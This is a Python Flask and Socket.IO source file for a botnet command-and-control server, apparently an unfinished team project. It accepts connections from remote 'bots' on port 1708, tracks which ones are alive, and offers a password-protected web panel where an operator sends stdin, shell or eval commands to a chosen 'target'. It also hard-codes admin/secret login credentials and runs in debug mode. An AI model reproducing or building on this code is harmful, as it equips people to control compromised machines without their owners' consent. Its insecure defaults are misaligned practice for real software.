import socket
import time
import json
from threading import Thread
from flask import Flask, render_template, session, request, Response
from flask_socketio import SocketIO, emit
from functools import wraps

# Loading library depends on how we want to setup the project later,
# for now this will do
try: from server import formatsock
except: import formatsock


''' See accompanying README for TODOs.

 To run: python server.py'''

HOST = 'localhost'
PORT = 1708
allConnections = {}
connected = ''  # temp variable for testing

# Set this variable to "threading", "eventlet" or "gevent" to test the
# different async modes, or leave it set to None for the application to choose
# the best option based on installed packages.
async_mode = None

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode=async_mode)
thread = None

def check_auth(username, password):
    """This function is called to check if a username /
    password combination is valid.
    """
    return username == 'admin' and password == 'secret' #TODO: set username and password

def authenticate():
    """Sends a 401 response that enables basic auth"""
    return Response(
    'Could not verify your access level for that URL.\n'
    'You have to login with proper credentials', 401,
    {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated


@app.route('/', methods=['GET', 'POST'])
@requires_auth
def index():
    global connected
    if request.method == 'POST':
        select = request.form.get('bot')
        connected = str(select)
    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(),
                           connected=connected)


@socketio.on('send_command', namespace='/bot')
def send(cmd):
    # raw_output = b''
    try:
        # raw_output = allConnections[connected].send(cmd['data'])
        allConnections[connected].send(cmd['data'])
    except:
        # This emit makes sense since it's exceptional
        emit('response',
             {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(connected), 'user': connected})
    # Look at the "Emitting from an External Process" section:
    # https://flask-socketio.readthedocs.io/en/latest/
    # We will want to "emit from a different process" in the following way:
    # A thread globally checks all targets for stdout/stderr output, then emits anything they
    # have said to the appropriate socketio sessions
    # Therefore the send_receive function should probably only emit the fact that the packets
    # was successfully sent to the target
    # -Sumner

    # if raw_output:
    #     output = json.loads(raw_output)
    #     stdout = output['stdout']
    #     stderr = output['stderr']
    #
    #     # There will not necessarly be
    #     emit('response',
    #          {'stdout': stdout[:-1], 'stderr': stderr[:-1], 'user': connected})

class BotNet(Thread):
    def __init__(self, tcpsock):
        Thread.__init__(self)
        self.tcpsock = tcpsock

    def run(self):
        while True:
            # TODO: does the 5 here limit us to five simultaneous targets?
            self.tcpsock.listen(5)
            (clientsock, (ip, port)) = self.tcpsock.accept()
            clientformatsock = formatsock.FormatSocket(clientsock)
            msgbytes = clientformatsock.recv()
            host_info = json.loads(msgbytes.decode('UTF-8'))
            print("[+] Received connection from {}".format(host_info['user']))
            allConnections[host_info['user'][:-1]] = Bot(clientsock, host_info)

            user = host_info['user'][:-1]
            socketio.emit('connection', {'user': user}, namespace='/bot')
            allConnections[user] = Bot(clientsock, host_info)

            # To test continuous stream, stdout is broken into multiple packets, hangs when waiting

            # allConnections[user].sendStdin('find /usr/local/lib\n')
            # while True:
            #     print(allConnections[user].recv())

# Background thread to check if we've lost any connections
class BotPinger(Thread):
    def run(self):
        while True:
            for bot in allConnections.values():
                self.ping(bot)
            time.sleep(60)  # checking every minute, this can be changed

    def ping(self, bot):
        # recv returns 0 if client disconnected
        if not bot.sock.rawrecv(1024):
            # TODO: del is maybe a bit much, we should try to gracefully disconnect if possible
            # - Sumner
            del allConnections[bot.user]
            socketio.emit('disconnect', {'user': bot.user}, namespace='/bot')
            print("[-] Lost connection to {}".format(bot.user))

class Bot:
    def __init__(self, sock, host_info):
        self.sock = formatsock.FormatSocket(sock)
        self.arch = host_info['arch'][:-1]
        self.user = host_info['user'][:-1]

    def send(self, cmd, type="stdin"):
        json_str = json.dumps({type:cmd})
        self.sock.send(json_str)
        # TODO: Sumner, need this to return result. Currently hangs.
        # Response: See slack + "def send_receive(cmd):" for details

    def sendStdin(self, cmd):
        self.send(cmd, type="stdin")

    def sendCmd(self, cmd):
        self.send(cmd, type="cmd")

    def sendEval(self, cmd):
        self.send(cmd, type="eval")

    def recv(self):
        return self.sock.recv()

if __name__ == "__main__":
    TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPSOCK.bind((HOST, PORT))
    BotNet(TCPSOCK).start()
    BotPinger().start()

    # TODO: setup helper threads to wait for targets to send stdout/stderr

    socketio.run(app, debug=True, use_reloader=False)
